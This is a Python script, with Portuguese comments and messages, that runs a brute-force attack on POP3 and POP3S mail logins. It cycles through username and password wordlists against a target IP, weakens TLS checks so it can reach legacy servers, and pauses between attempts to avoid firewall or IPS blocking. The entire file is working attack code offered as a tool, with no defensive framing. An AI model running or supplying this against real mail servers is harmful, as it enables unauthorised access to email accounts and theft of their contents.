import poplib
import sys
import time
import ssl

def pop3_brute():
    print("====================================================")
    print("POP3 Login Finder - Python 3 (Experimental)")
    print("====================================================\n")

    if len(sys.argv) < 2:
        print(f"Uso: python3 {sys.argv[0]} <IP_ALVO> [-ssl]")
        sys.exit(0)

    host = sys.argv[1]
    use_ssl = True if "-ssl" in sys.argv else False
    
    user_file = 'common-usernames.txt'
    pass_file = '/WordLists/wordlist-master/top10k.txt'

    # Configuração de SSL para aceitar o servidor legado (DH 1024)
    context = ssl.create_default_context()
    context.set_ciphers('DEFAULT@SECLEVEL=1')
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    print(f"[*] Alvo: {host} | SSL: {use_ssl}")
    print("[*] Carregando listas e iniciando ataque...\n")

    try:
        # Carrega as listas em memória
        with open(user_file, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
        with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]

        for user in users:
            for password in passwords:
                try:
                    if use_ssl:
                        # Porta 995 para SPOP3
                        p = poplib.POP3_SSL(host, port=995, context=context)
                    else:
                        # Porta 110 para POP3 normal
                        p = poplib.POP3(host, port=110)

                    # Tenta autenticação
                    p.user(user)
                    p.pass_(password)
                    
                    print(f"[+] LOGIN ENCONTRADO: {user}:{password}")
                    p.quit()
                    
                except poplib.error_proto:
                    # Erro de protocolo geralmente significa senha errada
                    pass
                except ConnectionRefusedError:
                    print("[-] Erro: Conexão recusada. Verifique se a porta está aberta.")
                    return
                except Exception as e:
                    print(f"[-] Erro inesperado: {e}")
                    pass
            
            # Pequena pausa para evitar bloqueio por firewall (IPS)
            time.sleep(1)

    except FileNotFoundError as e:
        print(f"[-] Erro: Arquivo de lista não encontrado ({e.filename})")

if __name__ == "__main__":
    pop3_brute()
